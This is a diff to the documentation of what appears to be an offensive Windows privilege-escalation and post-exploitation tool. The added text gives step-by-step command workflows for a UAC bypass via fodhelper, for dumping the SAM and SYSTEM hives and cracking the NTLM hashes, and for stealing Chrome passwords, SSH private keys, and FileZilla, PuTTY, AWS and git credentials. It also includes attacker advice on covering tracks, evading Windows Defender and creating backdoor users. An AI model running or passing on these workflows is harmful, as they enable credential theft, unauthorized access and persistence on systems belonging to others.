+# Result: Permission denied - suggests running priv_uac_bypass
+
+# 3. List the config directory to see what's there
+priv_list_dir C:\Windows\System32\config
+# Result: Shows SAM, SYSTEM, SECURITY, SOFTWARE files
+
+# 4. Attempt UAC bypass for elevation
+priv_uac_bypass
+# Result: UAC bypass executed with fodhelper.exe
+
+# 5. Verify elevation
+priv_check
+# Result: is_admin=true, integrity_level="High (Admin)"
+
+# 6. Now read the SAM file (contains password hashes)
+priv_read_binary C:\Windows\System32\config\SAM
+# Result: Base64-encoded SAM file
+
+# 7. Read the SYSTEM file (needed to decrypt SAM)
+priv_read_binary C:\Windows\System32\config\SYSTEM
+# Result: Base64-encoded SYSTEM file
+
+# 8. On attacker machine, decode and save both files:
+echo "BASE64_SAM_CONTENT" | base64 -d > SAM
+echo "BASE64_SYSTEM_CONTENT" | base64 -d > SYSTEM
+
+# 9. Extract hashes with samdump2 or pwdump:
+samdump2 SYSTEM SAM
+# Result: NTLM password hashes for all users
+
+# 10. Crack hashes with hashcat or john:
+hashcat -m 1000 hashes.txt rockyou.txt
+# Result: Plaintext passwords recovered
+```
+
+---
+
+### Scenario 6: Admin File Access - Browser Credential Theft (New!)
+
+```bash
+# Complete workflow for stealing saved browser passwords
+
+# 1. List Chrome user data directory
+priv_list_dir "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default"
+# Result: Shows Login Data, Cookies, History, etc.
+
+# 2. Read the Login Data file (SQLite database with passwords)
+priv_read_binary "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+# Result: Base64-encoded SQLite database
+
+# 3. On attacker machine, decode and save:
+echo "BASE64_CONTENT" | base64 -d > LoginData.db
+
+# 4. Query the database for saved credentials:
+sqlite3 LoginData.db "SELECT origin_url, username_value, password_value FROM logins"
+# Result: Encrypted passwords (require Chrome master key to decrypt)
+
+# 5. Read the Local State file to get encryption key
+priv_read_file "C:\Users\John\AppData\Local\Google\Chrome\User Data\Local State"
+# Result: JSON file with encrypted_key
+
+# 6. Use Chrome password decryption tools:
+# - Use Python script with win32crypt (Windows)
+# - Or use tools like LaZagne, ChromePass
+# Result: Plaintext passwords for all saved credentials
+```
+
+---
+
+### Scenario 7: Admin File Access - SSH Key Theft (New!)
+
+```bash
+# Complete workflow for stealing SSH private keys
+
+# 1. List user's SSH directory
+priv_list_dir C:\Users\Administrator\.ssh
+# Result: Shows id_rsa, id_rsa.pub, authorized_keys, known_hosts
+
+# 2. Read the private key
+priv_read_file C:\Users\Administrator\.ssh\id_rsa
+# Result: Private SSH key content (PEM format)
+
+# 3. Save the key on attacker machine
+# Copy the key content to id_rsa file
+
+# 4. Set proper permissions
 chmod 600 id_rsa
-ssh -i id_rsa root@target-server
-# Result: SSH access as different user
+
+# 5. Read authorized_keys to see which servers
+priv_read_file C:\Users\Administrator\.ssh\authorized_keys
+# Result: List of authorized public keys
+
+# 6. Read known_hosts to see connection history
+priv_read_file C:\Users\Administrator\.ssh\known_hosts
+# Result: List of previously connected servers
+
+# 7. Use the stolen key to connect
+ssh -i id_rsa administrator@target-server.com
+# Result: SSH access to remote servers without password
 ```
 
 ---
 
-### Scenario 4: Database Credential Extraction
+### Scenario 8: Admin File Access - Application Credentials (New!)
 
 ```bash
-# 1. Find credentials
-priv_sensitive
-# Finds: /var/www/html/config.php with DB password
+# Complete workflow for extracting application credentials
 
-# 2. Extract credentials
-cat /var/www/html/config.php
-# $db_user = "root";
-# $db_pass = "SuperSecret123";
+# 1. List common credential locations
+priv_list_dir "C:\Users\John\AppData\Roaming"
+# Result: Shows application folders (FileZilla, PuTTY, etc.)
 
-# 3. Access database
-mysql -u root -p'SuperSecret123'
-# Result: Database access, potentially more credentials
+# 2. Read FileZilla saved sites (FTP credentials)
+priv_read_file "C:\Users\John\AppData\Roaming\FileZilla\sitemanager.xml"
+# Result: XML with FTP server credentials in plaintext
+
+# 3. Read PuTTY saved sessions
+priv_list_dir "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"
+# Result: List of saved SSH sessions
+
+# 4. Read database connection strings
+priv_read_file "C:\Program Files\MyApp\config\database.config"
+# Result: Database credentials (server, username, password)
+
+# 5. Read .aws credentials
+priv_read_file C:\Users\John\.aws\credentials
+# Result: AWS access keys and secrets
+
+# 6. Read .git config
+priv_read_file C:\Projects\MyRepo\.git\config
+# Result: Git remote URLs (may contain credentials)
+
+# 7. Compile all credentials for offline analysis
+# Result: Complete credential database for target user
 ```
+
+---
 
 ## Performance Impact
 
-- **CPU**: Minimal (file searches can be intensive)
-- **Memory**: Low (output can be large)
-- **Disk**: Read-only operations
+- **CPU**: Minimal to Low (service queries can be intensive)
+- **Memory**: Low (output can be moderate)
+- **Disk**: Read-only operations mostly
+- **Network**: None (all local operations)
 - **Time**:
   - priv_check: < 1 second
-  - priv_enum: 10-30 seconds
+  - priv_enum: 5-15 seconds
   - priv_services: 2-5 seconds
-  - priv_tasks: 1-2 seconds
-  - priv_sensitive: 10-60 seconds (file searches)
+  - priv_tasks: 3-8 seconds
+  - priv_sensitive: 10-60 seconds (file searches in user directories)
+  - priv_weak_perms: 10-30 seconds (service enumeration)
+  - priv_dll_hijack: 30-120 seconds (searches multiple directories)
+  - priv_scan: 60-180 seconds (comprehensive scan)
 
 ## Security Considerations
 
 ### For Attackers
 
-✅ Run enumeration early
-✅ Save all output
-✅ Prioritize findings
-✅ Exploit manually
+✅ Run enumeration early to understand the environment
+✅ Save all output for offline analysis
+✅ Try UAC bypass if not admin
+✅ Look for DLL hijacking opportunities
+✅ Create multiple persistence mechanisms
 ✅ Cover tracks after escalation
-❌ Don't repeatedly enumerate
-❌ Avoid triggering alerts
+❌ Don't repeatedly run UAC bypass (gets detected)
+❌ Avoid triggering Windows Defender alerts
+❌ Don't create obvious backdoor usernames
 
 ### For Defenders
 
-✅ Monitor for enumeration patterns
-✅ Audit sudo configurations
-✅ Restrict SUID binaries
-✅ Harden cron permissions
-✅ Protect sensitive files
-✅ Monitor file access logs
-✅ Use security tools (fail2ban, SELinux)
+✅ Monitor for UAC bypass registry keys
+✅ Enable Windows Event Log auditing
+✅ Monitor service binary modifications
+✅ Use AppLocker or Windows Defender Application Control
+✅ Restrict DLL loading with Safe DLL Search Mode
+✅ Monitor scheduled task creation
+✅ Use Windows Defender ATP/EDR
+✅ Regular security assessments
+✅ Principle of least privilege
+✅ Keep Windows updated
 
 ## Summary
 
-Privilege escalation features:
+Windows privilege escalation features:
 ✅ Current privilege assessment
-✅ SUID binary enumeration
-✅ Sudo opportunity identification
-✅ Service permission analysis
+✅ UAC status checking
+✅ Service enumeration and permission analysis
 ✅ Scheduled task review
 ✅ Sensitive file discovery
-✅ Cross-platform support
-✅ Comprehensive enumeration
+✅ UAC bypass techniques (fodhelper, ComputerDefaults, eventvwr)
+✅ DLL hijacking opportunity identification
+✅ Multiple persistence mechanisms
+✅ Backdoor user creation (admin only)
+✅ Comprehensive Windows enumeration
+✅ **Admin file reading (text files with fallback methods)** - NEW!
+✅ **Admin file reading (binary files with base64 encoding)** - NEW!
+✅ **Admin directory listing (with file/directory separation)** - NEW!
 
-**This is a reconnaissance tool - exploitation must be done manually. Use only in authorized testing environments.**
+**This is primarily an enumeration tool with exploitation and file access capabilities. Use only in authorized Windows testing environments.**
